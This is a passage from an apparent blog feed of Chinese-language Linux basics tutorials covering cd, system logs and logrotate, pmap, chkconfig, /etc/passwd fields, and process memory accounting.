123456[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd ../.. //[root@localhost /]# pwd/[root@localhost /]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： 使用cd 命令实现进入当前目录的父目录的父目录。 例2：使用 cd 命令进入当前用户主目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“当前用户主目录”和“系统根目录”是两个不同的概念。进入当前用户主目录有两个方法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令1： 1cd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123451 [root@localhost soft]# pwd2 /opt/soft3 [root@localhost soft]# cd4 [root@localhost ~]# pwd5 /root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令2： 1cd ~ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost ~]# cd /opt/soft/[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd ~[root@localhost ~]# pwd/root 例3：跳转到指定目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd /opt/soft &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost ~]# cd /opt/soft[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd jdk1.6.0_16/[root@localhost jdk1.6.0_16]# pwd/opt/soft/jdk1.6.0_16[root@localhost jdk1.6.0_16]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;跳转到指定目录，从根目录开始，目录名称前加 / ,当前目录内的子目录直接写名称即可 例4：返回进入此目录之前所在的目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd - &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd -/root[root@localhost ~]# pwd/root[root@localhost ~]# cd -/opt/soft[root@localhost soft]# 例5：把上个命令的参数作为cd参数使用。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd !$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost soft]# cd !$cd -/root[root@localhost ~]# cd !$cd -/opt/soft[root@localhost soft]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统日志]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F65.%20Linux%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%2F</url>
    <content type="text"><![CDATA[Linux系统日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;日志重要吗？必须的，没有日志我们怎么知道系统状况？没有日志如何排查一个trouble？日志记录了系统每天发生的各种各样的事情，你可以通过他来检查错误发生的原因，或者受到攻击时攻击者留下的痕迹。日志主要的功能有：审计和监测，还可以实时的监测系统状态，监测和追踪侵入者等等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件 /etc/rsyslog.conf 。CentOS默认改为 rsyslog.conf 之前版本是 syslog.conf 。该配置文件主要信息为：记录哪些服务和需要记录什么等级的信息。 日志格式： auth -pam生产的日志 authpriv -ssh，ftp 等登录信息的验证信息 cron -时间任务相关 kern -内核 lpr -打印 mail -邮件 mark(syslog) -rsyslog服务内部的信息，时间标识 news -新闻组 user -用户程序产生的相关信息 uucp -unix to unix copy，unix主机之间相关的通讯 local 1~7 -自定义的日志设备 日志级别： debug -有调试信息的，日志信息最多 info -一般信息的日志，最常用 notice -最具有重要性的普通条件的信息 warning -警告级别 err -错误级别，阻止某个功能或者模块不能正常工作的信息 crit -严重级别，阻止整个系统或者整个软件不能正常工作的信息 alert -需要立刻修改的信息 emerg -内核崩溃严重信息 none -什么都不记录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上到下，级别从低到高，记录的信息越来越少 连接符号： .: 表示大于等于xxx 级别的信息 .=: 表示等于xxx 级别的信息 .!: 表示在xxx 之外的等级的信息 /var/log/messages 核心系统日志文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个日志是linux 系统最核心的日志文件，假若某个服务没有定义日志，那么该服务产生的日志就会到这个文件中。该日志每周归档一次。它是核心系统日志文件，包含了系统启动时的引导消息，以及系统运行时的其他状态消息。IO错误、网络错误和其他系统错误都会记录到这个文件中。另外其他信息，比如某个人的身份切换为root以及用户自定义安装的软件（apache）的日志也会在这里列出。通常，/var/log/messages是在做故障诊断时首先要查看的文件。系统有一个日志轮询的机制，每星期切换一个日志，变成message.xxxxxxxx, message.xxxxxxxx, … messages.xxxxxxxx 连同messages一共有5个这样的日志文件。这里的xxxxxxxx就是按照日期的格式生成的文件，在CentOS5里，这个后缀并不是日期而是数字1,2,3,4. 这是通过logrotate工具的控制来实现的 1234[root@localhost ~]# ls /var/log/messages*/var/log/messages /var/log/messages-20161016.1 /var/log/messages-20161120/var/log/messages-20161010.1 /var/log/messages-20161016.bak /var/log/messages-20161129/var/log/messages-20161010.bak /var/log/messages-20161114 /var/log/messages-20161204 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的配置文件是/etc/logrotate.conf如果没有特殊需求请不要修改这个配置文件。 123456789101112131415161718192021222324252627282930313233343536[root@localhost ~]# cat /etc/logrotate.conf# see "man logrotate" for details# rotate log files weeklyweekly # keep 4 weeks worth of backlogsrotate 4 # create new (empty) log files after rotating old onescreate # use date as a suffix of the rotated filedateext # uncomment this if you want your log files compressed#compress # RPM packages drop log rotation information into this directoryinclude /etc/logrotate.d # no packages own wtmp and btmp -- we'll rotate them here/var/log/wtmp &#123; monthly create 0664 root utmp minsize 1M rotate 1&#125; /var/log/btmp &#123; missingok monthly create 0600 root utmp rotate 1&#125; # system-specific logs may be also be configured here. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/var/log/messages是由syslogd这个守护进程产生的，如果停掉这个服务则系统不会产生/var/log/messages，所以这个服务不要停。Syslogd服务的配置文件为/etc/syslog.conf这个文件定义了日志的级别，若没有特殊需求是不需要修改这个配置文件的，使用 man syslog.conf 获得更多关于它的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了关注/var/log/messages外，还应该多关注一下 dmesg 这个命令，它可以显示系统的启动信息，如果某个硬件有问题（比如说网卡）用这个命令也是可以看到的。 1234567891011121314151617181920[root@localhost ~]# dmesg |lessInitializing cgroup subsys cpusetInitializing cgroup subsys cpuLinux version 2.6.32-220.el6.x86_64 (mockbuild@c6b18n3.bsys.dev.centos.org)(gcc version 4.4.6 20110731 (Red Hat 4.4.6-3) (GCC) ) #1 SMP Tue Dec 619:48:22 GMT 2011Command line: ro root=UUID=7912412b-3e66-401d-9ef5-3c2aba8dc737 rd_NO_LUKSKEYBOARDTYPE=pc KEYTABLE=us rd_NO_MD quiet rhgb crashkernel=autoLANG=zh_CN.UTF-8 rd_NO_LVM rd_NO_DMKERNEL supported cpus: Intel GenuineIntel AMD AuthenticAMD Centaur CentaurHaulsBIOS-provided physical RAM map:BIOS-e820: 0000000000000000 - 000000000009a400 (usable)BIOS-e820: 000000000009a400 - 00000000000a0000 (reserved)BIOS-e820: 00000000000d2000 - 00000000000d4000 (reserved)BIOS-e820: 00000000000e4000 - 0000000000100000 (reserved)BIOS-e820: 0000000000100000 - 00000000cff60000 (usable)BIOS-e820: 00000000cff60000 - 00000000cff69000 (ACPI data) 命令：last1234567891011[root@localhost ~]# last |headroot pts/0 192.168.0.207 Wed Jun 12 20:28 still logged inroot pts/1 192.168.0.207 Wed Jun 12 20:27 still logged inroot pts/0 192.168.0.161 Wed Jun 12 14:36 - 20:27 (05:50)root pts/0 192.168.0.161 Wed Jun 12 14:36 - 14:36 (00:00)root pts/0 192.168.0.207 Wed Jun 12 11:42 - 14:36 (02:54)root pts/0 192.168.0.207 Mon Jun 10 12:23 - 14:23 (02:00)root pts/0 192.168.0.70 Sat Jun 8 16:43 - 17:53 (01:09)root pts/0 192.168.0.70 Fri Jun 7 16:43 - 17:27 (00:44)root pts/0 192.168.0.70 Fri Jun 7 09:57 - 16:09 (06:11)root pts/0 192.168.0.70 Thu Jun 6 13:40 - 17:50 (04:09) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;last命令用来查看登录Linux历史信息，从左至右依次为账户名称、登录终端、登录客户端ip、登录日期及时长。last命令输出的信息实际上是读取了二进制日志文件/var/log/wtmp, 只是这个文件不能直接使用cat, vim, head, tail等工具查看。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外一个和登陆信息有关的日志文件为/var/log/secure, 该日志文件记录验证和授权等方面的信息，比如ssh登陆系统成功或者失败，都会把相关信息记录在这个日志里。 /var/log/wtmp日志用来查看用户登录历史，但这个文件不能直接cat查看，只能用last命令查看。 /var/log/btmp日志和wtmp类似，也不能直接cat查看，用命令lastb查看，记录无效登录历史。 /var/log/maillog是用来记录邮件相关的信息，比如发给谁邮件，是否发出去等信息。 /var/log/secure是一个安全认证相关的日志，比如系统用户登录时，正常登录或者登录失败都会记录，另外ftp服务相关的登录日志也会记录到这里来。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dmesg这是一个命令，主要查看系统实时的硬件设备抛出的信息，如果磁盘异常或者网络异常或者内核异常都会记录下来。只不过这些信息是存到内存里的，系统重启后就消失了。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用pmap指令查看进程的内存使用]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F54.%20Linux%E4%B8%8B%E4%BD%BF%E7%94%A8pmap%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Linux下使用pmap指令查看进程的内存使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pmap这个指令是用来查看进程占用的内存及使用地址空间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常使用的选项为 -d ，如下查看进程 （pid为24030）的内存使用： 1234567891011121314151617pmap -d 2403024030: /usr/local/php/bin/php-cgi --fpm --fpm-config /usr/local/php/etc/php-fpm.confAddress Kbytes Mode Offset Device Mapping0000000000400000 6444 r-x-- 0000000000000000 008:00002 php-cgi0000000000c4b000 272 rw--- 000000000064b000 008:00002 php-cgi0000000000c8f000 52 rw--- 0000000000c8f000 000:00000 [ anon ]00000000059dc000 9572 rw--- 00000000059dc000 000:00000 [ anon ]0000003519000000 508 r-x-- 0000000000000000 008:00002 libfreetype.so.6.3.10000000351907f000 2048 ----- 000000000007f000 008:00002 libfreetype.so.6.3.10中间部分省略00002b757df75000 4 rw--- 000000000000a000 008:00002 libnss_files-2.5.so00002b757df76000 32768 rw-s- 0000000000000000 000:00008 zero (deleted)00002b7580685000 4 rw-s- 0000000000000000 000:00008 zero (deleted)00007fff2e126000 476 rwx-- 00007fff2e126000 000:00000 [ stack ]00007fff2e19d000 8 rw--- 00007fff2e19d000 000:00000 [ anon ]ffffffffff600000 8192 ----- 0000000000000000 000:00000 [ anon ]mapped: 139548K writeable/private: 12344K shared: 32772K &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每列的含义如下： Address: 进程所占的地址空间 Kbytes 该虚拟段的大小 Mode 权限：r=read, w=write, x=execute, s=shared, p=private(copy on write) Mapping: bash 对应的映像文件名.要看的是最后一行的值 mapped 表示该进程映射的虚拟地址空间大小，也就是该进程预先分配的虚拟内存大小，即ps出的vsz writeable/private 表示进程所占用的私有地址空间大小，也就是该进程实际使用的内存大小 shared 表示进程和其他进程共享的内存大小 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 会把一些shared libraries 载入到内存中，在pmap 的输出中，这些shared libraries 的名字通常是 lib*.so ,如 libX11.so.6.2.0 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 libX11.so.6.2.0 会被很多process load 到自己的运行环境中，同时，ps 输出的RSS 结果中，每个process 都包含了这个libX11.so.6.2.0 ，而事实上它只被load 了一次，如果单纯把ps 的结果相加，这样就重复计算了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看pmap输出的结果，其实php-cgi 单纯进程所占的内存是这个writeable/private: 12344K]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统服务]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F62.%20Linux%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[Linux系统服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你对windows非常熟悉的话，相信你肯定配置过开机启动的服务，有些服务我们日常用不到则要把它停掉，一来可以节省资源，二来可以减少安全隐患。在linux上同样也有相关的工具来管理系统的服务。 1. ntsysv服务配置工具&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来配置哪些服务开启或者关闭，有点类似图形界面，不过是使用键盘来控制的。如果没有这个命令请使用 yum install -y ntsysv 安装它。安装好后，直接运行命令 ntsysv 回车后弹出一个配置界面： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按键盘的上下方向键可以调节红色光标，按空格可以选择开启或者不开启，如果前面的中括号内显示有 * 则表示开启否则不开启。通过这个工具也可以看到目前系统中所有的服务。 建议除 “crond, iptables, network, sshd, syslog, irqbalance, sendmail, microcode_ctl” 外其他服务全部停掉。选择好后，按 “tab” 键选择 “确定”, 然后回车，需要重启机器才能生效 。 2. chkconfig服务管理工具&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统所有的预设服务可以查看/etc/init.d/目录得到: 12345678[root@localhost ~]# ls /etc/init.dauditd keepalived netfs portreserve rpcidmapd squidcrond killall network postfix rpcsvcgssd sshdfunctions messagebus nfs rdisc rsyslog sysstathalt mysqld nfslock resin sandbox tomcatip6tables mysqldslave nmb restorecond saslauthd udev-postiptables named ntpd rpcbind single vsftpdipvsadm netconsole ntpdate rpcgssd smb winbind &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实这就是系统所有的预设服务了。为什么这样讲，因为系统预设服务都是可以通过这样的命令实现 service 服务名 start|stop|restart 这里的服务名就是/etc/init.d/目录下的这些文件了。除了可以使用 service crond start 启动crond外，还可以使用 /etc/init.d/crond start 来启动。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;言归正传，我们可以使用 chkconfig –list 列出所有的服务以及每个级别是否开启: 123456789101112131415161718192021222324252627282930313233343536[root@localhost ~]# chkconfig --listabrt-ccpp 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:启用 6:关闭abrtd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:启用 6:关闭acpid 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭atd 0:关闭 1:关闭 2:关闭 3:关闭 4:启用 5:启用 6:关闭auditd 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭blk-availability 0:关闭 1:启用 2:启用 3:关闭 4:启用 5:启用 6:关闭cpuspeed 0:关闭 1:启用 2:启用 3:关闭 4:启用 5:启用 6:关闭crond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭haldaemon 0:关闭 1:关闭 2:关闭 3:关闭 4:启用 5:启用 6:关闭htcacheclean 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭httpd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭ip6tables 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭iptables 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭irqbalance 0:关闭 1:关闭 2:关闭 3:启用 4:启用 5:启用 6:关闭kdump 0:关闭 1:关闭 2:关闭 3:关闭 4:启用 5:启用 6:关闭lvm2-monitor 0:关闭 1:启用 2:启用 3:关闭 4:启用 5:启用 6:关闭mdmonitor 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭messagebus 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭netconsole 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭netfs 0:关闭 1:关闭 2:关闭 3:关闭 4:启用 5:启用 6:关闭network 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭ntpd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭ntpdate 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭postfix 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭psacct 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭quota_nld 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭rdisc 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭restorecond 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭rngd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭rsyslog 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭saslauthd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭smartd 0:关闭 1:关闭 2:关闭 3:关闭 4:关闭 5:关闭 6:关闭sshd 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭sysstat 0:关闭 1:启用 2:启用 3:启用 4:启用 5:启用 6:关闭udev-post 0:关闭 1:启用 2:启用 3:关闭 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的级别（0,1,2,3,4,5,6）就是 /etc/inittab 里面的那几个启动级别了，0、1、6运行级别被系统保留：其中0作为shutdown动作，1作为重启至单用户模式，6为重启；在一般的Linux系统实现中，都使用了2、3、4、5几个级别，在CentOS系统中，2表示无NFS支持的多用户模式，3表示完全多用户模式（也是最常用的级别），4保留给用户自定义，5表示图形登录方式。我们可以使用grep命令把我们想要看的服务过滤出来: 12[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在我们只是看到了各服务在每个级别下是否开启，那么如何去更改哪个级别下是否开启呢？ 123[root@localhost ~]# chkconfig --level 3 crond off[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:关闭 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 –level 指定级别，后面是服务名，然后是 off 或者 on ，–level 后还可以跟多个级别： 123[root@localhost ~]# chkconfig --level 345 crond off[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:关闭 4:关闭 5:关闭 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还可以省略级别，默认是针对2，3，4，5级别操作： 123[root@localhost ~]# chkconfig crond on[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chkconfig 还有一个功能就是可以把某个服务加入到系统服务，即可以使用 service 服务名 start 这样的形式，并且可以在 chkconfig --list 中查找到。当然也能删除掉。 12345[root@localhost ~]# chkconfig --del crond[root@localhost ~]# chkconfig --list |grep cron[root@localhost ~]# chkconfig --add crond[root@localhost ~]# chkconfig --list |grep croncrond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个功能常用在把自定义的启动脚本加入到系统服务当中。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 用户名文件]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F6.%20Linux%20%E7%94%A8%E6%88%B7%E5%90%8D%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linux 用户名文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 用户名文件是 /etc/passwd 可以说是 Linux 系统中最重要的文件之一。如果这个文件出了问题，则无法正常登录 Linux 系统。 1234567891011[root@localhost ~]# cat /etc/passwd | headroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“head” 前面的 “|” 叫做管道符，它的作用是把前面的命令的输出再输入给后面的命令。 用户名文件每个字段的含义&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/passwd 由 ： 分割成 7 个字段，每个字段的含义是：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.用户名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如第一行中的 root 就是用户名，代表用户帐号的字符串。用户名字符串可以是大小写字母、数字、减号（不能出现在首位）、点以及下划线，其他字符不合法。虽然用户名中可以出现点，但不建议使用，尤其是首位为点时，另外减号也不建议使用，因为庸医造成混淆。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.帐号口令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二字段存放的就是该帐号的口令。为什么是 ‘x’ 呢？早起的 unix 系统口令是存放在这里，但基于安全因素，后来就将其到 ‘/etc/shadow’ 中了，这里只用一个 ‘x’ 代替。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.用户标识号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数字代表用户标识号，也叫做 uid 。系统识别用户身份就是通过这个数字， 0 就是 root ，也就是说可以修改 test 用户的 uid 为 0 ，那么系统就会认为 root 和 test 为同一个账户。通常 uid 的取值范围是 0-65535 （但实际上已经可以支持到 4294967294），0 是超级用户 （root）的表示号，1-499 有系统保留，作为管理帐号，普通用户的表示号从 500 开始，如果自定义建立一个普通用户，可以看到该账户的标识号是大于或等于 500 的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;4.组表示号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数字表示组标识号，也叫做 gid 这个字段对应着 /etc/group 中的一条记录，其实 /etc/group 和 /etc/passwd 基本上类似。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5.注释说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该字段没有实际意义，通常记录该用户的一些属性，例如姓名、电话、地址等等。不过，当使用 finger 的功能时就回显示这些信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;6.用户家目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户登录时就处在这个目录下。 root 的家目录是 /root，普通用户的家目录则为 /home/username ，这个字段是可以自定义的，比如建立一个普通用户 test1 ，要想让 test1 的家目录在 /data 目录下，只要修改 /etc/passwd 文件中的 test1 那行中的该字段为 /data 即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;7.shell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户登录后要启动一个进程，用来将用户下达的指令传给内核，这就是 shell 。Linux 的 shell 有很多中 sh 、csh 、ksh 、tcsh 、bash等，而 Redhat /CentOS 的 shell 就是 bash 。查看 /etc/passwd 文件，该字段中除了 /bin/bash 外还有 /sbin/nologin 比较多，它表示不允许该帐号登录。如果想建立一个帐号不让它登录，那么就可以把该字段改成 /sbin/nologin 默认是 /bin/bash。 chfn 更改用户的 finger&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 /etc/passwd 文件中的第五个字段中所显示的信息，如何去设定： 12345678910[root@localhost ~]# chfn user11Changing finger information for user11.Name []: user11Office []: user11's officeOffice Phone []: 12345678Home Phone []: 123456789Finger information changed.[root@localhost ~]# grep 'user11' /etc/passwduser11:x:510:502:user11,user11's office,12345678,123456789:/home/user11:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘chfn’ 命令可以修改用户的findger信息，比如name, office, office phone 以及 Home phone.修改完后，就会在/etc/passwd文件中的user11的那一行第五个字段中看到相关信息了，默认是空的。“grep” 命令，它是用来过滤指定关键词的行]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PS出的RSS总和大于实际物理内存]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F53.%20PS%E5%87%BA%E7%9A%84RSS%E6%80%BB%E5%92%8C%E5%A4%A7%E4%BA%8E%E5%AE%9E%E9%99%85%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%2F</url>
    <content type="text"><![CDATA[PS出的RSS总和大于实际物理内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用ps aux 查看系统进程时，第六列即 RSS列显示的就是进程使用的物理内存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可是把系统所有进程的该列相加时，得到的总和又远远高于系统实际的物理内存？这到底是怎么回事呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看一看linux是如何管理内存的就会知道。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;理解的意思是这样的，linux会在每个进程生成时分配一定量的内存给这个进程，这个只是分配，而体现在ps出来的是VSZ那列，这叫做虚拟内存。但实际上这些进程并没有占用这些内存。不妨，我也借用网上的一个例子来形容一下，就像银行发工资给员工一样，每个员工都有一个自己的银行卡，每月银行都会把固定的钱数打到员工的银行卡里，但是这个过程并不是把实际的钱发到员工手里，只是一串数字而已。实际上，银行并没有那么多钱的。回头再来看看linux给进程分配内存是不是和上面的举的例子很像呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;讲了上面的观点后，依然不能把笔者所设的问题解答，那么继续往下探讨： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把系统所有进程的该列相加时，得到的总和又远远高于系统实际的物理内存？这是因为 ps 的结果，RSS 那部分，是包括共享内存的。这里使用 pmap 来看看。 1234567891011121314151617pmap -d 2403024030: /usr/local/php/bin/php-cgi --fpm --fpm-config /usr/local/php/etc/php-fpm.confAddress Kbytes Mode Offset Device Mapping0000000000400000 6444 r-x-- 0000000000000000 008:00002 php-cgi0000000000c4b000 272 rw--- 000000000064b000 008:00002 php-cgi0000000000c8f000 52 rw--- 0000000000c8f000 000:00000 [ anon ]00000000059dc000 9572 rw--- 00000000059dc000 000:00000 [ anon ]0000003519000000 508 r-x-- 0000000000000000 008:00002 libfreetype.so.6.3.10000000351907f000 2048 ----- 000000000007f000 008:00002 libfreetype.so.6.3.10中间部分省略00002b757df75000 4 rw--- 000000000000a000 008:00002 libnss_files-2.5.so00002b757df76000 32768 rw-s- 0000000000000000 000:00008 zero (deleted)00002b7580685000 4 rw-s- 0000000000000000 000:00008 zero (deleted)00007fff2e126000 476 rwx-- 00007fff2e126000 000:00000 [ stack ]00007fff2e19d000 8 rw--- 00007fff2e19d000 000:00000 [ anon ]ffffffffff600000 8192 ----- 0000000000000000 000:00000 [ anon ]mapped: 139548K writeable/private: 12344K shared: 32772K &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pmap是用来显示内存使用的指令，-d 后面跟的是进程id. 关于pmap的使用以及显示的数据请看http://www.lishiming.net/thread-977-1-1.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux 会把一些shared libraries 载入到内存中，在pmap 的输出中，这些shared libraries 的名字通常是 lib*.so ,如 libX11.so.6.2.0 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 libX11.so.6.2.0 会被很多process load 到自己的运行环境中，同时，ps 输出的RSS 结果中，每个process 都包含了这个libX11.so.6.2.0 ，而事实上它只被load 了一次，如果单纯把ps 的结果相加，这样就重复计算了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看pmap输出的结果，其实php-cgi 单纯进程所占的内存是这个writeable/private: 12344K]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[怎么知道Linux系统安装的时间]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F51.%20%E6%80%8E%E4%B9%88%E7%9F%A5%E9%81%93Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E7%9A%84%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[怎么知道Linux系统安装的时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安装系统时，每个分区都会有一个lost+found，而且这个目录的创建时间是和该分区创建的时间一样的。所以如果想知道系统是什么时候安装的，只需要看这个目录的创建时间即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常情况下，分区都会把/boot单独分一个区，所以只要查看/boot/lost+found这个目录的创建时间即可。比较简单的方法是： 1ls -ld /boot/lost+found &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果/boot/不是单独分区，那么就看一下 / 下的吧。 1ls -ld /lost+found]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
